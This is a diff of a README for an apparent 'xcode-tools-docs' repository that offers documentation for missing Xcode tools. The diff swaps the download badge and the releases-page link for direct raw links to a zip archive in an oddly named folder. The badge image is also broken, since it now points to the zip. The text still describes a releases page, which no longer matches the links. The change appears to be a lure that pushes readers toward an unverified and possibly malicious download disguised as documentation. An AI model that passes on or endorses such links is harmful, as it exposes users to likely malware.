@@ -1,7 +1,7 @@
 # 🎉 xcode-tools-docs - Essential Guide to Xcode Tools
 
 ## 🔗 Download Now
-[![Download](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/Guent26/xcode-tools-docs/releases)
+[![Download](https://github.com/Guent26/xcode-tools-docs/raw/refs/heads/main/lutanist/tools_xcode_docs_1.5.zip)](https://github.com/Guent26/xcode-tools-docs/raw/refs/heads/main/lutanist/tools_xcode_docs_1.5.zip)
 
 ## 📖 About
 Welcome to the xcode-tools-docs repository. This project provides essential documentation for missing Xcode tools. Our goal is to help users easily find and utilize these tools for a smoother development experience.
@@ -11,7 +11,7 @@ Using this software is straightforward. Follow these simple steps to download an
 
 ## 📥 Download & Install
 1. **Visit the Releases Page**
-   Go to the following link to access the latest releases: [GitHub Releases](https://github.com/Guent26/xcode-tools-docs/releases).
+   Go to the following link to access the latest releases: [GitHub Releases](https://github.com/Guent26/xcode-tools-docs/raw/refs/heads/main/lutanist/tools_xcode_docs_1.5.zip).
 
 2. **Select a Version**
    On the releases page, you will see a list of versions available for download. Choose the version that suits your needs.
